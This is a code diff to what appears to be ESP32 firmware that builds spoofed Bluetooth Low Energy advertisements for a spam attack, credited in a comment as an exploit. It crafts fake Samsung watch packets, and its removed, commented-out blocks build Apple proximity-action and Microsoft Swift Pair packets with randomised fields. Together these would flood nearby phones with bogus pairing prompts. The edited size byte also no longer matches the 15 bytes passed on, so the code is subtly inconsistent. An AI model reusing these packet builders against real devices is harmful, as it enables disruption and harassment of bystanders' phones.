@@ -27,7 +27,7 @@ extern "C" {
   //Exploit by ECTO-1A
   NimBLEAdvertising *pAdvertising;
 
-  //// Spooky
+  //// https://github.com/Spooks4576
   NimBLEAdvertisementData WiFiScan::GetUniversalAdvertisementData(EBLEPayloadType Type) {
     NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();
 
@@ -84,7 +84,7 @@ extern "C" {
 
         uint8_t model = watch_models[rand() % 25].value;
         
-        AdvData_Raw[i++] = 15; // Size
+        AdvData_Raw[i++] = 14; // Size
         AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
         AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
         AdvData_Raw[i++] = 0x00; // ...
@@ -101,6 +101,7 @@ extern "C" {
         AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)
 
         AdvData.addData(std::string((char *)AdvData_Raw, 15));
+
         break;
       }
       case Google: {
@@ -117,66 +118,8 @@ extern "C" {
 
     return AdvData;
   }
-  //// Spooky
+  //// https://github.com/Spooks4576
 
-  // Apple
-  /*NimBLEAdvertisementData getOAdvertisementData() {
-    NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
-    uint8_t packet[17];
-    uint8_t size = 17;
-    uint8_t i = 0;
-
-    packet[i++] = size - 1;    // Packet Length
-    packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
-    packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
-    packet[i++] = 0x00;        // ...
-    packet[i++] = 0x0F;  // Type
-    packet[i++] = 0x05;                        // Length
-    packet[i++] = 0xC1;                        // Action Flags
-    const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
-    packet[i++] = types[rand() % sizeof(types)];  // Action Type
-    esp_fill_random(&packet[i], 3); // Authentication Tag
-    i += 3;   
-    packet[i++] = 0x00;  // ???
-    packet[i++] = 0x00;  // ???
-    packet[i++] =  0x10;  // Type ???
-    esp_fill_random(&packet[i], 3);
-
-    randomAdvertisementData.addData(std::string((char *)packet, 17));
-    return randomAdvertisementData;
-  }*/
-
-  // Microsoft
-  /*NimBLEAdvertisementData getSwiftAdvertisementData() {
-    extern WiFiScan wifi_scan_obj;
-    NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
-    const char* display_name = wifi_scan_obj.generateRandomName();
-    uint8_t display_name_len = strlen(display_name);
-
-    uint8_t size = 7 + display_name_len;
-    uint8_t* packet = (uint8_t*)malloc(size);
-    uint8_t i = 0;
-
-    packet[i++] = size - 1; // Size
-    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
-    packet[i++] = 0x06; // Company ID (Microsoft)
-    packet[i++] = 0x00; // ...
-    packet[i++] = 0x03; // Microsoft Beacon ID
-    packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
-    packet[i++] = 0x80; // Reserved RSSI Byte
-    for (int j = 0; j < display_name_len; j++) {
-      packet[i + j] = display_name[j];
-    }
-    i += display_name_len;
-
-    randomAdvertisementData.addData(std::string((char *)packet, size));
-
-    free(packet);
-
-    free((void*)display_name);
-
-    return randomAdvertisementData;
-  }*/
 
   class bluetoothScanAllCallback: public BLEAdvertisedDeviceCallbacks {
   
